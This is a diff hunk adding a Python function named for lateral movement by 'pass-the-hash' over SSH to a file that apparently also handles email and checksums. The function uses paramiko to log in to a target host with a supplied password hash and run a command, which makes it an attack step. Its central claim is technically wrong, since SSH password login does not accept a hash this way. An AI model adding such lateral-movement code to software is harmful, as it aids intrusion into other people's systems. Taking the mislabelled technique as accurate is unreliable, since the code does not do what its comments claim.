@@ -19,6 +19,39 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
 
+
+
+def lateral_movement_ssh_pth(target_host, target_username, target_password_hash):
+    try:
+        # Create an SSH client
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # Load the target host's public key from known_hosts
+        client.load_system_host_keys()
+
+        # Use the PtH technique to authenticate with the target host
+        client.connect(target_host, username=target_username, password=target_password_hash)
+
+        # Execute a command on the target host
+        command = "ls -l"
+        stdin, stdout, stderr = client.exec_command(command)
+
+        # Print the output of the command
+        for line in stdout:
+            print(line.strip())
+
+        # Close the SSH connection
+        client.close()
+
+    except paramiko.AuthenticationException:
+        print("Authentication failed.")
+    except paramiko.SSHException as e:
+        print("Error occurred while connecting to SSH server:", str(e))
+    except paramiko.ssh_exception.NoValidConnectionsError as e:
+        print("Error connecting to SSH server:", str(e))
+
+
 # Function to calculate checksum
 def calculate_checksum(data):
     if len(data) % 2 == 1:
